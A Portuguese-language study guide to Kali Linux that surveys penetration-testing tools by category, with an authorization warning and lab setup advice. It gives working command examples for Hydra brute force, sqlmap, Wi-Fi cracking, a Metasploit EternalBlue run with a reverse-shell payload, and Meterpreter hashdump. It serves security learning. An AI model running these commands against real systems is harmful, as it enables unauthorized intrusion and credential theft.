# Kali Linux — Guia do Básico ao Avançado

> ⚠️ Kali Linux é uma distribuição voltada para testes de segurança. Use suas ferramentas apenas em sistemas próprios, laboratórios controlados (TryHackMe, HackTheBox, VulnHub, Metasploitable) ou com autorização explícita por escrito. O mesmo aviso do arquivo de Segurança Ofensiva e Defensiva se aplica integralmente aqui.

---

## 1. O que é o Kali Linux

O **Kali Linux** é uma distribuição Linux baseada em Debian, mantida pela **Offensive Security**, voltada para testes de penetração, forense digital e auditoria de segurança. Vem com centenas de ferramentas pré-instaladas, já organizadas por categoria.

Formas de uso:
- **Máquina virtual** (recomendado para estudo — VirtualBox/VMware, com imagens oficiais prontas)
- **Instalação nativa** (dual boot ou máquina dedicada)
- **WSL** (Windows Subsystem for Linux, versão limitada)
- **Live USB** (roda sem instalar, útil para forense)
- **Kali NetHunter** (versão para Android)

Kali é baseado em Debian, então **os comandos do arquivo de Linux (apt, permissões, bash, etc.) todos funcionam normalmente aqui.**

---

## 2. Primeiros passos após instalar

```bash
sudo apt update && sudo apt full-upgrade -y   # atualizar o sistema
sudo apt install kali-linux-everything        # instala TODAS as ferramentas (opcional, pesado)
```

Por padrão, versões recentes do Kali usam um usuário não-root (diferente de versões antigas). Boas práticas:
```bash
sudo -l                     # ver o que seu usuário pode rodar como sudo
passwd                      # trocar sua senha
```

Criar um snapshot da VM logo após a instalação é uma prática recomendada, para poder voltar a um estado limpo depois de testes.

---

## 3. Organização das ferramentas por categoria

O menu do Kali organiza as ferramentas nas seguintes categorias (as mais relevantes):

| Categoria | Objetivo |
|---|---|
| **Information Gathering** | Reconhecimento (recon) |
| **Vulnerability Analysis** | Identificar vulnerabilidades |
| **Web Application Analysis** | Testar aplicações web |
| **Database Assessment** | Testar bancos de dados |
| **Password Attacks** | Quebra/teste de senhas |
| **Wireless Attacks** | Testes em redes Wi-Fi |
| **Exploitation Tools** | Explorar vulnerabilidades |
| **Sniffing & Spoofing** | Captura e falsificação de tráfego |
| **Post Exploitation** | Ações após obter acesso |
| **Forensics** | Análise forense digital |
| **Reporting Tools** | Geração de relatórios |

---

## 4. Information Gathering (Reconhecimento)

| Ferramenta | Função |
|---|---|
| `nmap` | Scanner de portas e serviços (ver detalhes no arquivo de Redes/Segurança) |
| `theHarvester` | Coleta e-mails, subdomínios, hosts de fontes públicas |
| `whois` | Informações de registro de domínio |
| `dnsenum` / `dnsrecon` | Enumeração de DNS |
| `netdiscover` | Descobre hosts ativos na rede local |
| `Recon-ng` | Framework modular de reconhecimento |
| `Maltego` | Visualização gráfica de relações entre entidades (OSINT) |

```bash
theHarvester -d exemplo.com -b google
netdiscover -r 192.168.1.0/24
dnsenum exemplo.com
```

---

## 5. Vulnerability Analysis

| Ferramenta | Função |
|---|---|
| `nikto` | Escaneia servidores web em busca de vulnerabilidades conhecidas |
| `OpenVAS` (Greenbone) | Scanner completo de vulnerabilidades de rede |
| `nmap --script vuln` | Scripts de detecção de vulnerabilidades via Nmap |

```bash
nikto -h http://alvo.local
nmap --script vuln alvo.local
```

---

## 6. Web Application Analysis

| Ferramenta | Função |
|---|---|
| `Burp Suite` | Intercepta/manipula requisições HTTP — ferramenta central de pentest web |
| `OWASP ZAP` | Alternativa gratuita ao Burp |
| `SQLmap` | Automatiza detecção e exploração de SQL Injection |
| `gobuster` / `dirb` / `ffuf` | Descoberta de diretórios e arquivos ocultos em servidores web |
| `wpscan` | Scanner específico para WordPress |
| `whatweb` | Identifica tecnologias usadas em um site |

```bash
gobuster dir -u http://alvo.local -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "http://alvo.local/produto?id=1" --dbs
wpscan --url http://alvo.local --enumerate u
```

---

## 7. Password Attacks

| Ferramenta | Função |
|---|---|
| `Hydra` | Brute force em vários protocolos (SSH, FTP, HTTP, RDP...) |
| `John the Ripper` | Quebra de hashes de senha offline |
| `Hashcat` | Quebra de hashes usando GPU (muito mais rápido) |
| `crunch` | Gera wordlists customizadas |
| `CeWL` | Gera wordlists a partir do conteúdo de um site |

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt
```

`rockyou.txt` é a wordlist de senhas vazadas mais famosa, incluída no Kali (geralmente precisa ser descompactada: `gunzip /usr/share/wordlists/rockyou.txt.gz`).

---

## 8. Sniffing & Spoofing

| Ferramenta | Função |
|---|---|
| `Wireshark` | Captura e analisa pacotes com interface gráfica detalhada |
| `tcpdump` | Captura de pacotes via linha de comando |
| `Ettercap` | Ataques Man-in-the-Middle (MITM), ARP spoofing |
| `bettercap` | Framework moderno para MITM, recon de rede e ataques Wi-Fi |

```bash
tcpdump -i eth0 -w captura.pcap
```

---

## 9. Wireless Attacks

| Ferramenta | Função |
|---|---|
| `aircrack-ng` (suite) | Conjunto de ferramentas para auditoria Wi-Fi (captura, quebra de WEP/WPA) |
| `airmon-ng` | Coloca a placa Wi-Fi em modo monitor |
| `airodump-ng` | Captura pacotes de redes Wi-Fi próximas |
| `aireplay-ng` | Gera tráfego (ex.: deauth attack) para forçar handshakes |
| `wifite` | Automatiza o processo de auditoria Wi-Fi |

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aircrack-ng captura.cap -w rockyou.txt
```

Requer placa de rede compatível com modo monitor/injeção de pacotes.

---

## 10. Exploitation Tools

| Ferramenta | Função |
|---|---|
| `Metasploit Framework` (`msfconsole`) | Framework mais usado para desenvolvimento e execução de exploits |
| `searchsploit` | Busca offline na base do Exploit-DB |
| `msfvenom` | Gera payloads customizados (shells, backdoors) |
| `Social Engineering Toolkit (SET)` | Automatiza ataques de engenharia social |

### Fluxo básico do Metasploit
```bash
msfconsole

search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
run
```

Comandos úteis dentro do `msfconsole`:
| Comando | Função |
|---|---|
| `search <termo>` | Busca módulos/exploits |
| `use <módulo>` | Seleciona um módulo |
| `show options` | Mostra parâmetros configuráveis |
| `set <opção> <valor>` | Define um parâmetro |
| `run` / `exploit` | Executa o módulo |
| `sessions` | Lista sessões ativas |
| `background` | Envia sessão atual para segundo plano |

`searchsploit` (offline, via terminal comum):
```bash
searchsploit apache 2.4
searchsploit -m 12345    # copia o exploit para a pasta atual
```

---

## 11. Post Exploitation

| Ferramenta | Função |
|---|---|
| `Meterpreter` | Payload avançado do Metasploit, permite controle interativo pós-exploração |
| `LinPEAS` / `WinPEAS` | Enumeração automática para escalação de privilégios |
| `Mimikatz` | Extrai credenciais da memória em sistemas Windows |
| `BloodHound` | Mapeia relações de privilégio em ambientes Active Directory |

Dentro do Meterpreter:
```
sysinfo
getuid
ps
migrate <PID>
hashdump
download /caminho/arquivo
```

---

## 12. Forense Digital

| Ferramenta | Função |
|---|---|
| `Autopsy` | Interface gráfica para análise forense de discos |
| `binwalk` | Analisa e extrai dados embutidos em arquivos binários/firmware |
| `foremost` | Recupera arquivos apagados a partir de assinaturas |
| `volatility` | Análise forense de memória RAM (dumps) |
| `exiftool` | Extrai metadados de arquivos (fotos, documentos) |

```bash
binwalk -e firmware.bin
exiftool foto.jpg
```

---

## 13. Wordlists e recursos inclusos

| Caminho | Conteúdo |
|---|---|
| `/usr/share/wordlists/rockyou.txt.gz` | Wordlist de senhas mais usada (precisa descompactar) |
| `/usr/share/wordlists/dirb/` | Wordlists para descoberta de diretórios web |
| `/usr/share/seclists/` (se instalado) | Coleção enorme de wordlists para várias finalidades (`apt install seclists`) |

---

## 14. Montando um laboratório de prática

Setup recomendado para estudar com segurança:
1. **Kali Linux** (VM atacante)
2. **Metasploitable2/3** (VM alvo, cheia de vulnerabilidades propositais)
3. **DVWA** ou **OWASP Juice Shop** (aplicações web vulneráveis)
4. Tudo isolado em uma **rede interna/host-only** da VirtualBox/VMware — nunca exposto à internet

Plataformas online para praticar com ambientes prontos: **TryHackMe** e **HackTheBox** (têm trilhas específicas para iniciantes).

---

## 15. Boas práticas específicas do Kali

- Nunca use o Kali como sistema do dia a dia conectado à internet sem necessidade — é otimizado para testes, não para uso geral
- Mantenha o sistema atualizado (`apt update && apt full-upgrade`)
- Use snapshots de VM antes de testes que possam "sujar" o sistema
- Troque a senha padrão imediatamente após instalar
- Documente cada ferramenta usada durante um teste (nome, versão, comando, resultado) — essencial para o relatório final
- Sempre confirme o escopo autorizado antes de rodar qualquer ferramenta contra um alvo

---

## 16. Próximos passos sugeridos

- Montar o laboratório descrito na seção 14 e praticar o fluxo completo: recon → scan → exploração → pós-exploração
- Fazer as primeiras salas de **TryHackMe** (trilha "Pre Security" e "Complete Beginner")
- Praticar `Nmap` + `Metasploit` contra o Metasploitable2
- Aprofundar em uma área específica: web (Burp/SQLmap), rede (Wireshark/aircrack-ng) ou Active Directory (BloodHound)
- Revisar os arquivos de **Segurança Ofensiva/Defensiva**, **Redes** e **Automação com Python**, que se conectam diretamente com as ferramentas deste guia
